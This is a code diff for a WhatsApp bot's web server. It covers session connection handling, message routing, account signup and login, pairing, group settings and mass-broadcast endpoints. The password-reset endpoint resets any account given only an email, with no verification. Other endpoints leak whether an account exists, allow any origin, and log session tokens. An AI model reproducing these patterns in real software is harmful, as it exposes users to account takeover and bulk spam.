+    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+        const session = webSessions.get(sessionId);
+        if (connection === "open") {
+            if (activeSockets[sessionId] && activeSockets[sessionId] !== sock) {
+                console.log(`[WebConn] stale socket opened for ${sessionId}; newer socket already active, closing stale one.`);
+                try { sock.end?.(new Error('stale-open')); } catch (_) {}
+                try { sock.ws?.close?.(); } catch (_) {}
+                return;
+            }
+            clearWebReconnectTimer(sessionId);
+            if (typeof githubSync !== "undefined") githubSync.triggerSync(true);
+            if (session) session.status = "connected";
+            botJids[sessionId] = sock.user?.id || null;
+            try { sock.sendPresenceUpdate("available"); } catch (_) {}
+            startPresenceHeartbeat(sessionId, sock);
+            await warmAllGroups(sock, `web:${sessionId}`);
+            saveSession(sessionId, phoneNumber, sessionId, false);
+            console.log(`[Web] Session ${sessionId} connected. JID: ${botJids[sessionId]}`);
+            logActivity(sessionId, "connect", `Bot connected as ${sock.user?.id || "unknown"}`);
+            pushToSSE(sessionId, { event: "status", connected: true });
+
+            // ── Generate & send session token to user's WhatsApp self-chat ──
+            // Check if we already have a token for this session (e.g. reconnect)
+            let token = Object.keys(webTokens).find(t => webTokens[t].userId === sessionId);
+            if (!token) {
+                token = generateWebToken();
+                webTokens[token] = { userId: sessionId, phone: phoneNumber, created: Date.now() };
+                saveWebTokens();
+            }
+            try {
+                await delay(2000);
+                const rawJid = (sock.user?.id || "").split(":")[0].split("@")[0];
+                const selfJid = rawJid + "@s.whatsapp.net";
+                const webUrl = process.env.RENDER_EXTERNAL_URL
+                    || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : "http://localhost:3000");
+                await sock.sendMessage(selfJid, {
+                    text:
+                        `╔══════════════════════╗\n` +
+                        `║   🔑  EVENTIDE OMEGA   ║\n` +
+                        `╚══════════════════════╝\n\n` +
+                        `✅ *Your bot is now connected!*\n\n` +
+                        `📋 *Your Session ID:*\n` +
+                        `\`\`\`${token}\`\`\`\n\n` +
+                        `👆 Copy that Session ID and paste it on the pairing page to access your dashboard:\n` +
+                        `${webUrl}/pair.html\n\n` +
+                        `_Keep this Session ID safe — it's your key to control this bot from the web dashboard._\n` +
+                        `━━━━━━━━━━━━━━━━━━━━`
+                });
+                console.log(`[Web] Session token sent to ${selfJid}: ${token}`);
+            } catch (e) {
+                console.error("[Web] Failed to send session token:", e?.message);
+            }
+        } else if (connection === "close") {
+            stopPresenceHeartbeat(sessionId);
+            const code = lastDisconnect?.error?.output?.statusCode;
+            const reason = lastDisconnect?.error?.message || lastDisconnect?.error?.toString?.() || "unknown";
+            debugLog(`[WebConn] close session=${sessionId} code=${code || "?"} reason=${String(reason).slice(0, 300)}`);
+            if (activeSockets[sessionId] && activeSockets[sessionId] !== sock) {
+                debugLog(`[WebConn] ignoring close from stale socket for ${sessionId}`);
+                return;
+            }
+            if (session && session.status !== "connected") session.status = "failed";
+            logActivity(sessionId, "disconnect", `Bot disconnected (code ${code || "unknown"})`);
+            pushToSSE(sessionId, { event: "status", connected: false });
+            delete activeSockets[sessionId];
+            if (code === DisconnectReason.loggedOut || code === DisconnectReason.forbidden || code === DisconnectReason.badSession) {
+                deleteSession(sessionId);
+                clearAuthState(sessionId);
+                return;
+            }
+            // Auto-reconnect
+            const retries = (retryCounts[sessionId] || 0) + 1;
+            retryCounts[sessionId] = retries;
+            if (retries <= MAX_RETRIES) {
+                const backoff = Math.min(4000 * Math.pow(2, retries - 1), 60000);
+                scheduleWebReconnect(sessionId, phoneNumber, backoff, `close code=${code || '?'} reason=${String(reason).slice(0,80)}`);
+            }
+        }
+    });
+
+    // Handle incoming WhatsApp messages exactly like any other session
+    sock.ev.on("messages.upsert", async ({ messages, type }) => {
+        for (const msg of messages) {
+            socketMsgStore.set(msg);
+            const maybeText = extractMsgText(msg) || "";
+            const trimmedMaybeText = maybeText.trimStart();
+            const looksLikeOwnerCommand = /^[.,?]/.test(trimmedMaybeText) || trimmedMaybeText.toLowerCase().split("\n").some(l => l.trim().startsWith(".hidetag"));
+            if ((msg.key.remoteJid || '').endsWith('@g.us') && trimmedMaybeText) {
+                await emitGroupTrace(sock, 'web-upsert-seen', {
+                    eventType: type,
+                    jid: msg.key.remoteJid,
+                    sender: msg.key.participant || msg.participant || msg.key.remoteJid,
+                    fromMe: msg.key.fromMe,
+                    rawBody: trimmedMaybeText,
+                });
+            }
+
+            // Web-paired sessions are trickier: commands sent from the linked primary phone
+            // inside groups can arrive as type=append with fromMe=false. If we filter those
+            // out here, handleMessage never gets a chance to normalize them and group commands
+            // appear dead. Promote such messages before the early return.
+            let ownerFromPrimaryPhone = false;
+            try {
+                const senderCandidates = getSenderJids(msg);
+                const linkedOwnerNumber = normalizeNum(phoneNumber);
+                ownerFromPrimaryPhone = senderCandidates.some(sj => normalizeNum(jidLocal(sj)) === linkedOwnerNumber);
+                if (ownerFromPrimaryPhone && !msg.key.fromMe) {
+                    msg.key.fromMe = true;
+                    debugLog(`[WebUpsert] promoted owner-origin message to fromMe for ${sessionId} type=${type} jid=${msg.key.remoteJid || '?'} body=${trimmedMaybeText.slice(0, 120)}`);
+                    await emitGroupTrace(sock, 'web-promote-fromme', {
+                        eventType: type,
+                        jid: msg.key.remoteJid,
+                        sender: msg.key.participant || msg.participant || msg.key.remoteJid,
+                        fromMe: msg.key.fromMe,
+                        rawBody: trimmedMaybeText,
+                        reason: 'owner-origin message matched linked phone number',
+                    });
+                }
+            } catch (e) { if (DEBUG_RUNTIME) debugLog(`[WebUpsert] owner-promotion error for ${sessionId}: ${e?.message || e}`); }
+
+            // Most non-notify fromMe messages are just the bot's own outgoing replies.
+            // But owner commands sent from the linked primary phone can arrive as append,
+            // so we must allow those through when they look like dot-commands.
+            if (msg.key.fromMe && type !== "notify" && !looksLikeOwnerCommand) {
+                try {
+                    const payload = buildSSEMessage(msg);
+                    if (payload) {
+                        pushToSSE(sessionId, payload);
+                        persistMessage(sessionId, payload);
+                    }
+                } catch (_) {}
+                continue;
+            }
+
+            // Do NOT drop trigger-prefixed group messages just because they arrived as
+            // append/non-notify. On some linked-primary-phone setups, owner/group
+            // commands come through this exact path; if we skip them here the bot looks
+            // dead in groups while still working in private chat.
+            const isOwnerGroupMessage = (msg.key.remoteJid || '').endsWith('@g.us') && ownerFromPrimaryPhone;
+            const isGroupTriggeredCommand = (msg.key.remoteJid || '').endsWith('@g.us') && looksLikeOwnerCommand;
+            if (type !== "notify" && !msg.key.fromMe && !isGroupTriggeredCommand && !isOwnerGroupMessage) {
+                if (DEBUG_RUNTIME && (looksLikeOwnerCommand || isOwnerGroupMessage)) debugLog(`[WebUpsert] dropped non-notify candidate for ${sessionId} type=${type} jid=${msg.key.remoteJid || "?"} body=${trimmedMaybeText.slice(0, 120)}`);
+                await emitGroupTrace(sock, 'web-drop', {
+                    eventType: type,
+                    jid: msg.key.remoteJid,
+                    sender: msg.key.participant || msg.participant || msg.key.remoteJid,
+                    fromMe: msg.key.fromMe,
+                    rawBody: trimmedMaybeText,
+                    reason: 'listener dropped non-notify non-fromMe message',
+                });
+                continue;
+            }
+            
+            // ── Build SSE payload FIRST (before any skips) ──
+            let payload = null;
+            try {
+                payload = buildSSEMessage(msg);
+            } catch (_) {}
+            
+            // ── PAUSE CHECK ──
+            // If bot is paused via dashboard, only allow .resume from the owner.
+            if (isBotPaused(sessionId)) {
+                const text = extractMsgText(msg) || "";
+                const isOwner = msg.key.fromMe || isDevJid((msg.key.participant || msg.key.remoteJid || "").replace(/:.+@/, "@"));
+                if (!(isOwner && text.trim().toLowerCase().startsWith(".resume"))) continue;
+            }
+
+            // ── Track recent private chats for /broadcast & /chats endpoint ──
+            try {
+                const remoteJid = msg.key.remoteJid;
+                if (remoteJid && remoteJid.endsWith("@s.whatsapp.net")) {
+                    if (!recentPrivateChats.has(sessionId)) recentPrivateChats.set(sessionId, new Map());
+                    const chats = recentPrivateChats.get(sessionId);
+                    chats.set(remoteJid, { jid: remoteJid, lastSeen: Date.now() });
+                    // Cap at 200 most recent — drop oldest when over
+                    if (chats.size > 200) {
+                        const oldest = [...chats.entries()].sort((a, b) => a[1].lastSeen - b[1].lastSeen)[0];
+                        if (oldest) chats.delete(oldest[0]);
+                    }
+                }
+            } catch (_) {}
+
+            // ── ACTIVITY LOG (commands only) ──
+            try {
+                const t = extractMsgText(msg) || "";
+                if (t.startsWith(".") && t.length > 1) {
+                    const cmd = t.split(/\s+/)[0];
+                    const who = msg.key.fromMe ? "you" : ((msg.key.participant || msg.key.remoteJid || "").split("@")[0].split(":")[0]);
+                    logActivity(sessionId, "cmd", `${cmd} — by ${who}`);
+                }
+            } catch (_) {}
+
+            // ── PERSIST message + contact name ──
+            if (payload) {
+                persistMessage(sessionId, payload);
+                // Track contact names from incoming messages
+                const remoteJid = msg.key.remoteJid;
+                if (remoteJid && !msg.key.fromMe) {
+                    const name = msg.pushName || msg.notifyName || null;
+                    if (name) {
+                        if (remoteJid.endsWith("@g.us") && msg.key.participant) {
+                            persistContactName(sessionId, msg.key.participant, name);
+                        } else if (remoteJid.endsWith("@s.whatsapp.net")) {
+                            persistContactName(sessionId, remoteJid, name);
+                        }
+                    }
+                }
+            }
+
+            // ── Push to SSE (ALWAYS, including bot's own messages) ──
+            // BUT skip pushing suspicious bug payloads to protect the dashboard
+            if (payload) {
+                try {
+                    const botJidForSSE = sock?.user?.id || null;
+                    const msgText = extractMsgText(msg) || "";
+                    const isBugMsg = !msg.key.fromMe && getBotSecurity(botJidForSSE, "antibug") && isSuspiciousBugPayload(msgText);
+                    if (!isBugMsg) {
+                        pushToSSE(sessionId, payload);
+                    }
+                } catch (_) {}
+            }
+
+            if ((msg.key.remoteJid || '').endsWith('@g.us') && trimmedMaybeText) {
+                await emitGroupTrace(sock, 'web-pass-handleMessage', {
+                    eventType: type,
+                    jid: msg.key.remoteJid,
+                    sender: msg.key.participant || msg.participant || msg.key.remoteJid,
+                    fromMe: msg.key.fromMe,
+                    rawBody: trimmedMaybeText,
+                    reason: 'passing to handleMessage',
+                });
+            }
+            await handleMessage(sock, msg);
+        }
+    });
+
+    return pairingCode;
+    })();
+    webSessionStartPromises.set(sessionId, launch);
+    try {
+        return await launch;
+    } finally {
+        webSessionStartPromises.delete(sessionId);
+    }
+}
+
+// --- KEEP-ALIVE + WEB SERVER ---
+const PING_PORT = parseInt(process.env.PORT) || 3000;
+const PUBLIC_DIR = path.join(__dirname, "public");
+const MIME = {
+    ".html": "text/html; charset=utf-8",
+    ".css":  "text/css",
+    ".js":   "application/javascript",
+    ".json": "application/json",
+    ".png":  "image/png",
+    ".jpg":  "image/jpeg",
+    ".svg":  "image/svg+xml",
+    ".ico":  "image/x-icon",
+};
+
+function serveStatic(res, filePath) {
+    const ext = path.extname(filePath).toLowerCase();
+    try {
+        const data = fs.readFileSync(filePath);
+        res.writeHead(200, { "Content-Type": MIME[ext] || "application/octet-stream" });
+        res.end(data);
+    } catch {
+        res.writeHead(404, { "Content-Type": "text/plain" });
+        res.end("404 Not Found");
+    }
+}
+
+function readBody(req) {
+    return new Promise((resolve, reject) => {
+        let body = "";
+        req.on("data", chunk => body += chunk);
+        req.on("end", () => resolve(body));
+        req.on("error", reject);
+    });
+}
+
+function formatUptimeShort(ms) {
+    const s = Math.floor(ms / 1000);
+    const d = Math.floor(s / 86400);
+    const h = Math.floor((s % 86400) / 3600);
+    const m = Math.floor((s % 3600) / 60);
+    if (d > 0) return `${d}d ${h}h`;
+    if (h > 0) return `${h}h ${m}m`;
+    return `${m}m`;
+}
+
+function startKeepAliveServer(port) {
+    const server = http.createServer(async (req, res) => {
+        const urlObj = new URL(req.url, `http://localhost:${port}`);
+        const pathname = urlObj.pathname;
+
+        // ── AUTH: Sign up ─────────────────────────────────────────────────
+        if (pathname === "/api/auth/signup" && req.method === "POST") {
+            res.setHeader("Content-Type", "application/json");
+            try {
+                const body = JSON.parse(await readBody(req));
+                const name  = (body.name  || "").trim();
+                const email = (body.email || "").trim().toLowerCase();
+                const pass  = body.password || "";
+                if (!name)  { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Name required." })); }
+                if (!email || !email.includes("@") || email.length > 254) {
+                    res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Valid email required." }));
+                }
+                if (pass.length < 6) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Password must be 6+ characters." })); }
+                if (webUsers[email])  { res.writeHead(409); return res.end(JSON.stringify({ ok:false, error:"Account already exists. Please sign in." })); }
+                const { hash, salt } = hashPassword(pass);
+                webUsers[email] = { name, email, hash, salt, created: Date.now() };
+                saveWebUsers();
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok:true, message:"Account created. You can now sign in." }));
+            } catch (e) {
+                res.writeHead(500);
+                return res.end(JSON.stringify({ ok:false, error:e?.message || "Server error." }));
+            }
+        }
+
+        // ── AUTH: Login ───────────────────────────────────────────────────
+        if (pathname === "/api/auth/login" && req.method === "POST") {
+            res.setHeader("Content-Type", "application/json");
+            try {
+                const body = JSON.parse(await readBody(req));
+                const email = (body.email || "").trim().toLowerCase();
+                const pass  = body.password || "";
+                const user  = webUsers[email];
+                if (!user) { res.writeHead(401); return res.end(JSON.stringify({ ok:false, error:"Invalid email or password." })); }
+                let ok = false;
+                try { ok = verifyPassword(pass, user.salt, user.hash); } catch { ok = false; }
+                if (!ok) { res.writeHead(401); return res.end(JSON.stringify({ ok:false, error:"Invalid email or password." })); }
+                const token = newSessionToken();
+                webUserSess[token] = { email, created: Date.now(), lastSeen: Date.now() };
+                saveWebUserSess();
+                setSessionCookie(res, token);
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok:true, name:user.name, email:user.email }));
+            } catch (e) {
+                res.writeHead(500);
+                return res.end(JSON.stringify({ ok:false, error:e?.message || "Server error." }));
+            }
+        }
+
+        // ── AUTH: Logout ──────────────────────────────────────────────────
+        if (pathname === "/api/auth/logout" && req.method === "POST") {
+            res.setHeader("Content-Type", "application/json");
+            const tok = parseCookies(req).eo_auth;
+            if (tok && webUserSess[tok]) { delete webUserSess[tok]; saveWebUserSess(); }
+            clearSessionCookie(res);
+            res.writeHead(200);
+            return res.end(JSON.stringify({ ok:true }));
+        }
+
+        // ── AUTH: Who am I ────────────────────────────────────────────────
+        if (pathname === "/api/auth/me" && req.method === "GET") {
+            res.setHeader("Content-Type", "application/json");
+            const u = getAuthedUser(req);
+            res.writeHead(200);
+            return res.end(JSON.stringify({ ok:true, authed: !!u, name: u?.name || null, email: u?.email || null }));
+        }
+        // ── AUTH: Forgot password check ──────────────────────────────────
+        if (pathname === "/api/auth/forgot-check" && req.method === "POST") {
+            res.setHeader("Content-Type", "application/json");
+            try {
+                const body = JSON.parse(await readBody(req));
+                const email = (body.email || "").trim().toLowerCase();
+                const user = webUsers[email];
+                if (!user) { res.writeHead(200); return res.end(JSON.stringify({ ok:false, error:"Email not found." })); }
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok:true, name:user.name }));
+            } catch (e) {
+                res.writeHead(500);
+                return res.end(JSON.stringify({ ok:false, error:e?.message || "Server error." }));
+            }
+        }
+
+        // ── AUTH: Reset password ────────────────────────────────────────
+        if (pathname === "/api/auth/reset-password" && req.method === "POST") {
+            res.setHeader("Content-Type", "application/json");
+            try {
+                const body = JSON.parse(await readBody(req));
+                const email = (body.email || "").trim().toLowerCase();
+                const pass = body.password || "";
+                const user = webUsers[email];
+                if (!user) { res.writeHead(401); return res.end(JSON.stringify({ ok:false, error:"Account not found." })); }
+                if (pass.length < 6) { res.writeHead(400); return res.end(JSON.stringify({ ok:false, error:"Password must be 6+ characters." })); }
+                const { hash, salt } = hashPassword(pass);
+                user.hash = hash;
+                user.salt = salt;
+                saveWebUsers();
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok:true, message:"Password updated! Sign in with your new password." }));
+            } catch (e) {
+                res.writeHead(500);
+                return res.end(JSON.stringify({ ok:false, error:e?.message || "Server error." }));
+            }
+        }
+
+
+        // ── API: Generate pairing code ────────────────────────────────────
+        if (pathname === "/api/pair" && req.method === "POST") {
+            res.setHeader("Access-Control-Allow-Origin", "*");
+            res.setHeader("Content-Type", "application/json");
+            try {
+                const body = JSON.parse(await readBody(req));
+                const phone = (body.phone || "").replace(/[^0-9]/g, "");
+                if (!phone || phone.length < 8 || phone.length > 15) {
+                    res.writeHead(400);
+                    return res.end(JSON.stringify({ ok: false, error: "Invalid phone number." }));
+                }
+                const sessionId = "web_" + phone;
+
+                // 1) If a TRULY live socket exists for this number, just confirm it.
+                const liveSock = activeSockets[sessionId];
+                if (isSocketLive(liveSock)) {
+                    const existing = webSessions.get(sessionId);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({
+                        ok: true,
+                        code: existing?.code || "LINKED",
+                        sessionId,
+                        alreadyConnected: true,
+                    }));
+                }
+
+                // 2) Otherwise it's a stale/dead socket — tear it down and force fresh pair.
+                //    `force=true` on body wipes auth state so we always get a NEW 8-char code.
+                let forceFresh = !!body.force;
+                // If the stored auth says "registered" but socket is dead, the device was
+                // most likely unlinked from WhatsApp → auth is useless → wipe & re-pair.
+                if (liveSock || webSessions.has(sessionId)) {
+                    forceFresh = true;
+                }
+                await tearDownWebSession(sessionId, { wipeAuth: forceFresh });
+
+                // 3) Start a new pairing session.
+                const code = await startBotForWeb(sessionId, phone);
+                if (!code || code === "LINKED") {
+                    // Pairing code call failed — bubble up so the UI shows a real error
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({
+                        ok: false,
+                        error: "Could not generate pairing code. Please tap Generate again.",
+                        sessionId,
+                    }));
+                }
+                res.writeHead(200);
+                res.end(JSON.stringify({ ok: true, code, sessionId }));
+            } catch (err) {
+                console.error("[Web/pair]", err?.message);
+                res.writeHead(500);
+                res.end(JSON.stringify({ ok: false, error: err?.message || "Server error." }));
+            }
+            return;
+        }
+
+        // ── API: Check session status ─────────────────────────────────────
+        if (pathname === "/api/status" && req.method === "GET") {
+            res.setHeader("Access-Control-Allow-Origin", "*");
+            res.setHeader("Content-Type", "application/json");
+            const sessionId = urlObj.searchParams.get("id");
+            const session = webSessions.get(sessionId);
+            const sock = activeSockets[sessionId];
+            const connected = sock?.user?.id ? true : (session?.status === "connected");
+            res.writeHead(200);
+            res.end(JSON.stringify({
+                ok: true,
+                status: connected ? "connected" : (session?.status || "unknown"),
+            }));
+            return;
+        }
+
+        // ── API: Dashboard stats (legacy) ─────────────────────────────────
+        if (pathname === "/api/stats" && req.method === "GET") {
+            res.setHeader("Access-Control-Allow-Origin", "*");
+            res.setHeader("Content-Type", "application/json");
+            const uptimeMs = process.uptime() * 1000;
+            let groupsList = [];
+            for (const sock of Object.values(activeSockets)) {
+                try {
+                    if (sock?.groupFetchAllParticipating) {
+                        const groups = await sock.groupFetchAllParticipating();
+                        groupsList = Object.values(groups).map(g => ({ name: g.subject || "?", members: g.participants?.length || 0 }));
+                        break;
+                    }
+                } catch {}
+            }
+            res.writeHead(200);
+            res.end(JSON.stringify({ ok: true, uptime: formatUptimeShort(uptimeMs * 1000), groups: groupsList.length, groups_list: groupsList.slice(0, 50) }));
+            return;
+        }
+
+        // ── API: Session-specific routes (/api/s/:token/...) ─────────────
+        const sessionMatch = pathname.match(/^\/api\/s\/([^/]+)\/(.+)$/);
+        if (sessionMatch) {
+            res.setHeader("Access-Control-Allow-Origin", "*");
+            res.setHeader("Content-Type", "application/json");
+            const [, rawToken, action] = sessionMatch;
+            const token = decodeURIComponent(rawToken);
+            const tokenData = webTokens[token];
+            if (!tokenData) {
+                res.writeHead(401);
+                return res.end(JSON.stringify({ ok: false, error: "Invalid or expired session token." }));
+            }
+            const userId = tokenData.userId;
+            const sock   = activeSockets[userId];
+            const connected = isSocketLive(sock);
+
+            // ── GET /info ───────────────────────────────────────────────
+            if (action === "info" && req.method === "GET") {
+                const uptimeMs = process.uptime() * 1000;
+                const jid = botJids[userId] || sock?.user?.id || null;
+                const phone = tokenData.phone || (jid ? jid.split(":")[0].split("@")[0] : null);
+                res.writeHead(200);
+                return res.end(JSON.stringify({
+                    ok: true,
+                    connected,
+                    jid: jid || null,
+                    phone: phone || null,
+                    name: sock?.user?.name || "Eventide Bot",
+                    uptime: formatUptimeShort(uptimeMs),
+                }));
+            }
+
+            // ── GET /groups ─────────────────────────────────────────────
+            if (action === "groups" && req.method === "GET") {
+                if (!sock) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, groups: [], total: 0 }));
+                }
+                try {
+                    const raw = await sock.groupFetchAllParticipating();
+                    const settings = (() => {
+                        try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8")); } catch { return {}; }
+                    })();
+                    const groups = Object.values(raw).map(g => ({
+                        jid:     g.id,
+                        name:    g.subject || g.id,
+                        members: g.participants?.length || 0,
+                        settings: settings[g.id] || {},
+                    }));
+                    const selfJid = sock.user?.id
+                        ? (sock.user.id.split(":")[0].split("@")[0] + "@s.whatsapp.net") : null;
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, groups, total: groups.length, self_jid: selfJid }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message, groups: [], total: 0 }));
+                }
+            }
+
+            // ── POST /send ──────────────────────────────────────────────
+            if (action === "send" && req.method === "POST") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    let { jid, text } = body;
+                    if (!jid || !text) {
+                        res.writeHead(400);
+                        return res.end(JSON.stringify({ ok: false, error: "Missing jid or text." }));
+                    }
+                    jid = jid.trim();
+                    if (/^\d+$/.test(jid)) jid += "@s.whatsapp.net";
+                    await sock.sendMessage(jid, { text: text.trim() });
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── POST /toggle ────────────────────────────────────────────
+            // Toggle a feature for a specific group
+            if (action === "toggle" && req.method === "POST") {
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { groupJid, feature, enabled } = body;
+                    if (!groupJid || !feature || typeof enabled !== "boolean") {
+                        res.writeHead(400);
+                        return res.end(JSON.stringify({ ok: false, error: "Missing groupJid, feature, or enabled." }));
+                    }
+                    const allowed = ["antilink","antispam","antidelete","antibot","antimention","antidemote","welcome","goodbye","slowmode"];
+                    if (!allowed.includes(feature)) {
+                        res.writeHead(400);
+                        return res.end(JSON.stringify({ ok: false, error: "Unknown feature: " + feature }));
+                    }
+                    setGroupSetting(groupJid, feature, enabled);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, groupJid, feature, enabled }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── POST /toggle-all ────────────────────────────────────────
+            // Toggle a feature for ALL groups this session's bot is in
+            if (action === "toggle-all" && req.method === "POST") {
+                if (!sock) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { feature, enabled } = body;
+                    if (!feature || typeof enabled !== "boolean") {
+                        res.writeHead(400);
+                        return res.end(JSON.stringify({ ok: false, error: "Missing feature or enabled." }));
+                    }
+                    const raw = await sock.groupFetchAllParticipating();
+                    const groupJids = Object.keys(raw);
+                    for (const gid of groupJids) setGroupSetting(gid, feature, enabled);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, affected: groupJids.length, feature, enabled }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── POST /broadcast ─────────────────────────────────────────
+            // body: { text, targets:["groups","private"], delay: <seconds> }
+            if (action === "broadcast" && req.method === "POST") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    const { text, targets, delay: delayMs } = body;
+                    if (!text) {
+                        res.writeHead(400);
+                        return res.end(JSON.stringify({ ok: false, error: "No message text." }));
+                    }
+                    const tgts = Array.isArray(targets) && targets.length ? targets : ["groups"];
+                    const delayBetween = Math.min((delayMs || 5) * 1000, 60000);
+                    let plannedGroups = 0, plannedPrivate = 0;
+                    if (tgts.includes("groups")) {
+                        try { plannedGroups = Object.keys(await sock.groupFetchAllParticipating()).length; } catch {}
+                    }
+                    if (tgts.includes("private")) {
+                        plannedPrivate = (recentPrivateChats.get(userId)?.size) || 0;
+                    }
+                    logActivity(userId, "broadcast", `Started: ${plannedGroups} group(s), ${plannedPrivate} private chat(s)`);
+                    // Run in background — respond immediately
+                    (async () => {
+                        let sent = 0, failed = 0;
+                        try {
+                            if (tgts.includes("groups")) {
+                                const raw = await sock.groupFetchAllParticipating();
+                                for (const gid of Object.keys(raw)) {
+                                    try { await sock.sendMessage(gid, { text }); sent++; } catch { failed++; }
+                                    if (delayBetween > 0) await delay(delayBetween);
+                                }
+                            }
+                            if (tgts.includes("private")) {
+                                const chats = [...(recentPrivateChats.get(userId)?.values() || [])];
+                                for (const c of chats) {
+                                    try { await sock.sendMessage(c.jid, { text }); sent++; } catch { failed++; }
+                                    if (delayBetween > 0) await delay(delayBetween);
+                                }
+                            }
+                        } catch (e) { console.error("[Web/broadcast]", e?.message); }
+                        logActivity(userId, "broadcast", `Finished: ${sent} sent, ${failed} failed`);
+                        pushToSSE(userId, { event: "broadcast-done", sent, failed });
+                    })();
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true, queued: { groups: plannedGroups, private: plannedPrivate } }));
+                } catch (e) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message }));
+                }
+            }
+
+            // ── GET /stream — Server-Sent Events for real-time messages ────
+            if (action === "stream" && req.method === "GET") {
+                res.writeHead(200, {
+                    "Content-Type":  "text/event-stream",
+                    "Cache-Control": "no-cache",
+                    "Connection":    "keep-alive",
+                    "Access-Control-Allow-Origin": "*",
+                });
+                res.flushHeaders();
+                // Register this client
+                if (!sseClients.has(userId)) sseClients.set(userId, new Set());
+                sseClients.get(userId).add(res);
+                // Send a heartbeat comment every 25s to keep proxy alive
+                const hb = setInterval(() => {
+                    try { res.write(": heartbeat\n\n"); } catch (_) {
+                        clearInterval(hb);
+                        sseClients.get(userId)?.delete(res);
+                    }
+                }, 25000);
+                // Send an immediate "connected" event
+                res.write(`data: ${JSON.stringify({ event: "connected", userId })}\n\n`);
+                req.on("close", () => {
+                    clearInterval(hb);
+                    sseClients.get(userId)?.delete(res);
+                });
+                return; // keep connection open
+            }
+
+            // ── POST /delete-message ────────────────────────────────────────
+            if (action === "delete-message" && req.method === "POST") {
+                if (!sock || !connected) {
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: "Bot not connected." }));
+                }
+                try {
+                    const body = JSON.parse(await readBody(req));
+                    // key: { remoteJid, id, fromMe, participant? }
+                    // type: "for-everyone" | "for-me"
+                    const { key, type: delType } = body;
+                    if (!key?.id || !key?.remoteJid) {
+                        res.writeHead(400);
+                        return res.end(JSON.stringify({ ok: false, error: "Missing key.id or key.remoteJid" }));
+                    }
+                    
+                    // Build a proper proto key for deletion
+                    const deleteKey = {
+                        remoteJid: key.remoteJid,
+                        id: key.id,
+                        fromMe: !!key.fromMe,
+                        participant: key.participant || undefined,
+                    };
+                    
+                    if (delType === "for-everyone") {
+                        // Use proper Baileys delete protocol
+                        // For delete for everyone, we send a delete message
+                        await sock.sendMessage(key.remoteJid, { delete: deleteKey });
+                        logActivity(userId, "delete", `Deleted for everyone in ${key.remoteJid}`);
+                    } else {
+                        // Delete for me only — remove from local persistence + dashboard UI.
+                        // Baileys does not reliably support "delete for me" via the WA protocol,
+                        // so we only clean up our own stored data and notify the dashboard.
+                        // The message stays on WhatsApp servers/other devices (which is correct
+                        // behavior for "delete for me" — it's a local-only action).
+                        logActivity(userId, "delete", `Deleted for me in ${key.remoteJid}`);
+                    }
+                    
+                    // Remove from persisted messages
+                    try {
+                        if (webMessages[userId]?.[key.remoteJid]) {
+                            webMessages[userId][key.remoteJid] = webMessages[userId][key.remoteJid].filter(m => m.msgId !== key.id);
+                            saveWebMessages();
+                        }
+                    } catch (_) {}
+                    
+                    // Notify SSE clients about deletion
+                    pushToSSE(userId, { event: "deleted", jid: key.remoteJid, msgId: key.id, forEveryone: delType === "for-everyone" });
+                    
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: true }));
+                } catch (e) {
+                    console.error("[Delete] Error:", e?.message);
+                    res.writeHead(200);
+                    return res.end(JSON.stringify({ ok: false, error: e?.message || "Delete failed" }));
+                }
+            }
+
+            // ── GET /chats — recent private chats (for broadcast targeting) ──
+            // ── GET /messages?jid=xxx — load persisted messages for a chat ──
+            if (action === "messages" && req.method === "GET") {
+                const chatJid = urlObj.searchParams.get("jid");
+                if (!chatJid) {
+                    res.writeHead(400);
+                    return res.end(JSON.stringify({ ok: false, error: "Missing jid parameter" }));
+                }
+                const msgs = getPersistedMessages(userId, chatJid);
+                res.writeHead(200);
+                return res.end(JSON.stringify({ ok: true, messages: msgs, total: msgs.length }));
+            }
+
+            if (action === "chats" && req.method === "GET") {
+                // Determine the bot's own JID so we can exclude it from private chats
+                // (the dashboard adds self-chat separately to avoid duplicates)
+                const selfJid = sock?.user?.id
+                    ? (sock.user.id.split(":")[0].split("@")[0] + "@s.whatsapp.net") : null;
+                    
+                const recent = [...(recentPrivateChats.get(userId)?.values() || [])]
